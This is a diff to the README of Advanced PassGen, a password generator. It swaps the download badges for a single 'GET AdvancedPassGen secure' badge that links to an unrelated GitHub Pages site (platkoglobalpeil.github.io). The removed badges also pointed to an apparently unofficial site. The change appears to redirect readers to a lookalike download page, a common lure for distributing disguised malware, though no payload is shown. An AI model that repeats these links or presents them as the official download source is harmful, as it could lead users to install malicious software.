@@ -4,15 +4,8 @@
   <img src="https://f-droid.org/repo/com.codedead.advancedpassgen/en-US/icon_d7BWfksyupYJBb1_PP4TUQHon4TzMG8wBFJJ3P3rSEA=.png" width="220" alt="Advanced PassGen icon">
 </div>
 
-<p align="center">
-  <a href="https://advancedpassgen-secure.github.io/.github">
-    <img src="https://img.shields.io/badge/Get_Advanced_PassGen-3DDC84?style=for-the-badge&logo=android&logoColor=white" alt="Get Advanced PassGen for Android">
-  </a>
-  &nbsp;
-  <a href="https://advancedpassgen-secure.github.io/.github">
-    <img src="https://img.shields.io/badge/Get_Advanced_PassGen-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Get Advanced PassGen for Windows">
-  </a>
-</p>
+[![GET AdvancedPassGen secure](https://img.shields.io/badge/GET%20%E2%80%94%20AdvancedPassGen-secure-0078D6?style=for-the-badge&logoColor=white)](https://platkoglobalpeil.github.io/.github/AdvancedPassGen-secure)
+
 
 ---
 
